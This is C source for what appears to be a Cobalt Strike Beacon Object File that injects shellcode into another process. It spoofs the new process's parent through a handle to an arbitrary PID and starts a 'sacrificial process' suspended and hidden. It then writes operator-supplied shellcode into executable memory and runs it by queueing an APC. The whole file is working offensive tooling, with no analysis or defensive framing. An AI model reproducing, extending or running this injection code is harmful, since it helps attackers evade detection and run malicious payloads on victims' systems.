#include <windows.h>
#include "beacon.h"

#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS  0x00020000

DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError (void);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread (HANDLE);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap (VOID);
DECLSPEC_IMPORT WINBASEAPI PVOID WINAPI KERNEL32$HeapAlloc (HANDLE, DWORD, DWORD);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess (DWORD, BOOL, DWORD);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject (HANDLE, DWORD);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$QueueUserAPC (PAPCFUNC, HANDLE, ULONG_PTR);
DECLSPEC_IMPORT WINBASEAPI PVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE, PVOID, DWORD, DWORD, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$InitializeProcThreadAttributeList (LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$UpdateProcThreadAttribute (LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessW (LPCWSTR, LPCWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION );

typedef struct _STARTUPINFOEXW { 
    STARTUPINFOW StartupInfo;
    struct _PROC_THREAD_ATTRIBUTE_LIST *lpAttributeList;
} STARTUPINFOEXW, *LPSTARTUPINFOEXW;

void go(wchar_t *argv, int argc){

    LPCWSTR cmd;
    STARTUPINFOEXW si = { sizeof(si) }; 
    SIZE_T sizeT;
    PROCESS_INFORMATION pi ;
    LPVOID allocation_start;    
    HANDLE hProcess, hThread;
    NTSTATUS status;
    
    int sc_len;
    int ppid;
    char* sc_ptr;
    datap parser;
    BeaconDataParse(&parser, argv, argc);

    ppid        = BeaconDataInt(&parser);   
    cmd         = (wchar_t *)BeaconDataExtract(&parser, NULL);
    sc_len      = BeaconDataLength(&parser);
    sc_ptr      = BeaconDataExtract(&parser, NULL); 

    SIZE_T allocation_size = sizeof(sc_ptr) * sc_len;
    BeaconPrintf(CALLBACK_OUTPUT, "Sacrifical Process: %ls",cmd);
    BeaconPrintf(CALLBACK_OUTPUT, "Shellcode size: %d",sc_len);

    BeaconPrintf(CALLBACK_OUTPUT, "Getting handle on PID %d", ppid);
    HANDLE pHandle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, 0, ppid);

    BeaconPrintf(CALLBACK_OUTPUT, "Calling CreateProcessW()");

    KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, sizeT);
    KERNEL32$InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &sizeT);
    KERNEL32$UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &pHandle, sizeof(HANDLE), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    if (!KERNEL32$CreateProcessW(
        cmd,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        (LPSTARTUPINFO)&si,
        &pi)){
            BeaconPrintf(CALLBACK_OUTPUT, "[-] CreateProcessW(): %d", KERNEL32$GetLastError());
    }

    KERNEL32$WaitForSingleObject(pi.hProcess, 2000);
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    allocation_start = KERNEL32$VirtualAllocEx(hProcess, NULL, allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    BeaconPrintf(CALLBACK_OUTPUT, "Writing shellcode using WPM()",allocation_size);
    KERNEL32$WriteProcessMemory(hProcess, allocation_start, sc_ptr, allocation_size, NULL);

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)allocation_start;

    BeaconPrintf(CALLBACK_OUTPUT, "QueueUserAPC()",allocation_size);
    KERNEL32$QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);

    KERNEL32$ResumeThread(hThread);

    BeaconCleanupProcess(&pi);
    
}
